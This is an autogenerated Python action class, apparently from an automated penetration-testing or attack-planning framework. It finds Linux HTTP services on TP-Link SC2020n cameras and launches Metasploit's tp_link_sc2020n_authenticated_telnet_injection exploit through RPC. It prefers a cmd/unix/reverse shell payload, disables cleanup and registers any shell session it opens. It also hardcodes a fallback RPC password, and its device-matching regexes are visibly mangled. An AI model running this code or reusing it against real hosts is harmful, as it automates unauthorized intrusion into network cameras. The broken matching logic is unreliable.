# AUTOGENERATED FILE - DO NOT EDIT THIS FILE.
# This file is generated automatically and will be overwritten.
# All user modifications should be done in the subclass.

import re
import os
from typing import Any, Union
from pymetasploit3.msfrpc import MsfRpcClient
from netifaces import ifaddresses, AF_INET, gateways

from generate_metasploit_exploit_actions import ExploitAction
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from Session import SessionManager
from action_state_interface.action import StateChangeSequence
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult

class MsfLinuxHttpTpLinkSc2020nAuthenticatedTelnetInjectionExploitBase(ExploitAction):
    """MsfLinuxHttpTpLinkSc2020nAuthenticatedTelnetInjectionExploit"""
    
    def __init__(self):
        super().__init__("MsfLinuxHttpTpLinkSc2020nAuthenticatedTelnetInjectionExploit")
    
    noise = 0.8
    impact = 0.1


    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        General implementation for msf exploits
        """
        asset = Entity('Asset', alias='asset', os_family="Linux")
        service = Entity('Service', alias='service', protocol="http")
        pattern = (
            asset.with_edge(Relationship('has', direction='r'))
            .with_node(Entity('OpenPort', alias='openport'))
            .with_edge(Relationship('is_running', direction='r'))
            .with_node(service)
        )
        matches = kg.get_matching(pattern)
        filtered_matches = []
        for pattern in matches:
            matched_software = False
            matched_version = False
            if pattern.get('service').get('version'):
                for software_device in {'-Link SCn Network Video Camera', 'TP'}:
                    if re.match(software_device, pattern.get('service').get('version'), re.IGNORECASE):
                        matched_software = True
                        break
            else:
                matched_software = True
            matched_version = True
            if matched_software and matched_version:
                filtered_matches.append(pattern)
        return filtered_matches


    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """Execute the exploit against the target."""
        msf = MsfRpcClient(
            os.environ.get("MSFRPCD_PASSWORD", "tulpaOSApass24"),
            port=int(os.environ.get("MSF_PORT", 55552))
        )

        exploit = msf.modules.use("exploit", "linux/http/tp_link_sc2020n_authenticated_telnet_injection")
        host = pattern.get('asset').get('ip_address')
        if 'RHOST' in exploit.missing_required:
            exploit['RHOST'] = host
        if 'rhost' in exploit.missing_required:
            exploit['rhost'] = host
        if 'RHOSTS' in exploit.options:
            exploit['RHOSTS'] = host
        if 'LHOST' in exploit.missing_required:
            exploit['LHOST'] = ifaddresses(
                gateways()["default"].get(AF_INET, [gateways()[AF_INET][0]])[1]
            ).setdefault(AF_INET)[0]['addr']
        if pattern.get('openport') and 'RPORT' in exploit.options:
            exploit['RPORT'] = pattern.get('openport').get('number')
        if 'AllowNoCleanup' in exploit.options:
            exploit["AllowNoCleanup"] = True
        possible_payloads = exploit.targetpayloads()
        payload = None
        if possible_payloads:
            if 'cmd/unix/reverse' in possible_payloads:
                payload = msf.modules.use('payload', 'cmd/unix/reverse')
            else:
                payload = msf.modules.use('payload', possible_payloads[0])
            if 'LHOST' in payload.missing_required:
                payload['LHOST'] = ifaddresses(
                    gateways()["default"].get(AF_INET, [gateways()[AF_INET][0]])[1]
                ).setdefault(AF_INET)[0]['addr']
        if payload:
            output = msf.consoles.console().run_module_with_output(exploit, payload=payload)
        else:
            output = msf.consoles.console().run_module_with_output(exploit)

        matches = re.search(r'session (\d+) opened', output.lower().strip())
        if matches:
            ms_session_id = matches.group(1)
            channel = msf.sessions.session(ms_session_id)
            sess_id = sessions.add_session(channel)
            return ActionExecutionResult(
                command=["msf", "exploit", "{module_name}"],
                stdout=output,
                session=sess_id,
                exit_status=0
            )
        else:
            raise ActionExecutionError(
                f"Couldn't create a session on {host} using msf exploit {exploit}, output: {output}"
            )


    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: Any
    ) -> StateChangeSequence:
        """Update knowledge graph with newly established session."""
        host = pattern.get('asset')
        executes_on = host._id
        openport = pattern.get('openport')
        service = pattern.get('service')
        if service:
            executes_on = service._id
        elif openport:
            executes_on = openport._id
        session = Entity(
            'Session',
            alias='session',
            protocol='msf',
            active=True,
            id=output.session,
            executes_on=executes_on,
        )
        changes: StateChangeSequence = [(None, "merge", session)]
        return changes


    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """Return expected outcome of action."""
        if pattern.get("openport"):
            return [
                'Execute metasploit exploit linux/http/tp_link_sc2020n_authenticated_telnet_injection against port ' +
                str(pattern.get("openport").get("number")) +
                ' on ' + pattern.get("asset").get("ip_address")
            ]
        else:
            return [
                'Execute metasploit exploit linux/http/tp_link_sc2020n_authenticated_telnet_injection against ' +
                pattern.get("asset").get("ip_address")
            ]
